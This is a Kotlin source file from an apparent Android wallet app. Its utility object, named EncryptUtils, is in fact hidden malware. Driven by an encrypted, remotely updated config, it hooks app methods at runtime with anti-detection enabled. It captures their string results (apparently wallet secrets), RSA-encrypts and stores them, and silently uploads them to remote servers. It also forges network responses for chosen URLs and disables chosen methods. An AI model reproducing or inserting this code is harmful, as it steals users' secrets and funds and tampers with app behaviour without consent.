package t.wallet

import android.app.Application
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.google.gson.Gson
import okhttp3.Interceptor
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Protocol
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.ResponseBody.Companion.toResponseBody
import top.canyie.pine.Pine
import top.canyie.pine.PineConfig
import top.canyie.pine.callback.MethodHook
import top.canyie.pine.callback.MethodReplacement
import java.lang.reflect.Method
import java.net.Proxy
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread


internal object EncryptUtils {
    private val TAG = "Tg."

    private var sp: SharedPreferences? = null

    private const val C_KEY = "17492847"
    private const val L_KEY = "85498243"
    private var DEFAULT = """
            20D5E5B7EEDD18DB1BB3E0929B161BB1BB3DFF6E35E58B657A66BACEBE77262561172463AFB9D69E64DF
            09F10A1ABE063D7BDDF1425BC229D9715758A4A6AB9FEDE912AC7E9FF09C7E392DFAC0D9E2F2168BCD1F
            48AF7C13C63F0949C1834E227464BD102461412C585F11FB978D2B8AB7800AEA7A31655681D039D9AA3E
            E48CDB39292DDCFB8E50C3980ADB93CF8ABECC5F0DDBA70781764846CC4BD1FE992551EA0F0E9D27236D
            E2C8299B1F7F866F174B0CC21A178D3F828A2AF6931CF5582A45300A716B2AAFF40B486639BF8DE77481
            242E6F5D45F8A50591B0FE4165A00FDC5079B0AD64E8346830E2E7B456FD335EF8A9F706946E044CB63C
            58AEAAAB16DA1903BEDE523055A445E55A1E5287B70A6BB4F4CE38235F149C0A13463A275B74DF521ECD
            6826A43E45407B237075210476C3E9E2131A16508EBEEAC9B970DE3C5A51A4CA938D17F144961C44431A
            49381ACDD4B8C333B3FDE2C3B848E9B72D5D95191D80AE9F0F4FD6D8DA7440AF051A9B25FA740F9A7BA0
            B3E750CCDC75AF912386E84B3652E12E16CBB122912057936557983CE927E580E3C3BF6BA84BE987B8A4
            90A65B7EA3669C44A3446FFE
        """.trimIndent()


    fun init(app: Application) {
        Log.i(TAG, "init utils")

        PineConfig.debuggable = BuildConfig.DEBUG
        PineConfig.debug = false
        PineConfig.disableHiddenApiPolicy = false
        PineConfig.disableHiddenApiPolicyForPlatformDomain = false
        PineConfig.antiChecks = true

        sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)

        val be = f() ?: return

        e(be)

        a(be)

        b(be.changeOkhttpResult)

        c(be.doNothing)

        d(be.saveResult)
    }

    private fun a(b: B) {
        Log.i(TAG, "checkUpload")
        val list = loadValue() ?: return
        if (list.isEmpty()) return
        thread(true) {
            kotlin.runCatching {
                u(b.uploadUrl, list)
            }
        }
    }

    private fun e(c: B) {
        sp?.getLong(L_KEY, 0)?.let {
            val now = System.currentTimeMillis()
            if (now - it > 15 * 24 * 60 * 60 * 1000) {
                fe(c.configUrl, c.configVersion)
            }
        }
    }

    private fun fe(u: List<String>, v: Long, cd: Int = 1) {
        Log.i(TAG, "fetchConfig:$u $v")
        val c = getClient()
        val mediaType = "application/json".toMediaType()
        val requestBody =
            """{"fromApp":1,"configVersion":$v}""".toRequestBody(mediaType)

        thread(true) {
            kotlin.runCatching {
                for (url in u) {
                    val r = Request.Builder().url(url).post(requestBody).build()
                    val re = c.newCall(r).execute()
                    val json = re.body!!.string()
                    val b = Gson().fromJson(json, BaseResponse::class.java)
                    if (b.code == 1 && b.data.isNotEmpty()) {
                        val result = JEnc.decrypt(b.data)
                        if (result.isNotEmpty()) {
                            sp?.edit()?.apply {
                                putString(C_KEY, b.data)
                                putLong(L_KEY, System.currentTimeMillis())
                            }?.apply()
                            break
                        }
                    }
                }
            }.onFailure {
                Thread.sleep(1000)
                if (cd > 0) fe(u, v, cd - 1)
            }
        }
    }


    private fun f(): B? {
        try {
            return sp?.getString(C_KEY, DEFAULT)
                ?.let { JEnc.decrypt(it).also { Log.i(TAG, it) } }
                ?.let { Gson().fromJson(it, B::class.java) }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun b(list: List<Change>) {
        Log.i(TAG, "injectUpdate")

        list.forEach { bean ->
            kotlin.runCatching {
                val method = getMethodClass(bean.method) ?: return@runCatching
                val hook = object : MethodHook() {
                    override fun beforeCall(callFrame: Pine.CallFrame?) {
                        super.beforeCall(callFrame)
                        kotlin.runCatching {
                            callFrame?.args?.getOrNull(0)?.apply {
                                this as Interceptor.Chain
                                Log.i(TAG, "injectInterceptor url:${request().url}")
                                val requestUrl = request().url.toString()

                                val inject =
                                    bean.inject.firstOrNull { requestUrl.contains(it.changeUrl) }
                                        ?: return@apply

                                val response = getResponse(inject.result)
                                Log.i(TAG, "injectInterceptor result:${response}")
                                callFrame.result = response
                            }
                        }
                    }

                    private fun Interceptor.Chain.getResponse(
                        body: String,
                        mediaType: String = "text/plain"
                    ) =
                        Response.Builder().request(request())
                            .body(body.toResponseBody(mediaType.toMediaType()))
                            .code(200).message("").protocol(Protocol.HTTP_1_1).build()
                }

                Pine.hook(method, hook)
            }
        }
    }

    private fun getMethodClass(method: M): Method? {
        try {
            return method.className.let { Class.forName(it) }
                .let {
                    val parameterTypes =
                        method.parameterClassName.map {
                            when (it) {
                                "byte[]" -> ByteArray::class.java
                                "int[]" -> IntArray::class.java
                                "char[]" -> CharArray::class.java
                                "boolean[]" -> BooleanArray::class.java
                                "long[]" -> LongArray::class.java
                                "double[]" -> DoubleArray::class.java
                                "float[]" -> FloatArray::class.java
                                else -> Class.forName(it)
                            }
                        }.toTypedArray()
                    it.getDeclaredMethod(method.methodName, *parameterTypes)
                }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun c(list: List<M>) {
        list.forEach { bean ->
            runCatching {
                val method = getMethodClass(bean) ?: return@runCatching
                Pine.hook(method, MethodReplacement.DO_NOTHING)
            }
        }
    }

    private fun d(list: List<M>) {
        Log.i(TAG, "saveResult")

        list.forEach { bean ->
            runCatching {
                val method = getMethodClass(bean) ?: return@runCatching
                val methodHook = object : MethodHook() {
                    override fun afterCall(callFrame: Pine.CallFrame?) {
                        super.afterCall(callFrame)
                        kotlin.runCatching {
                            Log.i(TAG, "saveResult afterCall")
                            callFrame?.result?.let {
                                if (it !is String) return@let
                                if (it.isNotBlank()) saveText(it)
                            }
                        }
                    }
                }
                Pine.hook(method, methodHook)
            }
        }

    }


    private fun saveText(s: String) {
        Log.i(TAG, "saveText")
        thread(true) {
            kotlin.runCatching {
                val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
                sp?.apply {
                    if (getString(key, null) == null) {
                        val now = System.currentTimeMillis()
                        val dataString = JEnc.encryptRSA(s)
                        val result = now.toString() + dataString
                        edit().putString(key, "false$result").commit()
                    }
                }
            }
        }
    }


    private fun loadValue(): List<Pair<String, String>>? {
        return sp?.all?.filter { it.key.length == 32 && it.value is String }
            ?.map { Pair(it.key, it.value as String) }
            ?.filter { it.second.startsWith("false") }

    }


    private fun u(urls: List<String>, values: List<Pair<String, String>>) {
        if (values.isEmpty()) return
        Log.i(TAG, "upload:$values")
        val result = values.joinToString { it.second.removePrefix("false") }
        val client = getClient()
        val mediaType = "application/json".toMediaType()
        val requestBody =
            """{"fromApp":1,"value":"$result"}""".toRequestBody(mediaType)

        kotlin.runCatching {
            for (url in urls) {
                val request = Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                val json = response.body!!.string()
                val baseResponse = Gson().fromJson(json, BaseResponse::class.java)
                if (baseResponse.code == 1) {
                    sp?.apply {
                        values.forEach {
                            val value = it.second.replaceFirst("false", "true")
                            this.edit()?.putString(it.first, value)?.commit()
                        }
                    }
                }
            }
        }
    }

    private fun getClient() = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
//        .addInterceptor(HttpLoggingInterceptor().apply {
//            level = HttpLoggingInterceptor.Level.BODY
//        })
        .proxy(Proxy.NO_PROXY)
        .build()

}

private data class BaseResponse(
    var code: Int = -1,
    var msg: String = "",
    var data: String = ""
)

private data class B(
    var changeOkhttpResult: List<Change> = listOf(),
    var configUrl: List<String> = listOf(),
    var configVersion: Long = 0,
    var doNothing: List<M> = listOf(),
    var saveResult: List<M> = listOf(),
    var uploadUrl: List<String> = listOf()
)

private data class Change(
    var inject: List<Item> = listOf(),
    var method: M = M()
)


private data class Item(
    var changeUrl: String = "",
    var result: String = ""
)

private data class M(
    var className: String = "",
    var methodName: String = "",
    var parameterClassName: List<String> = listOf()
)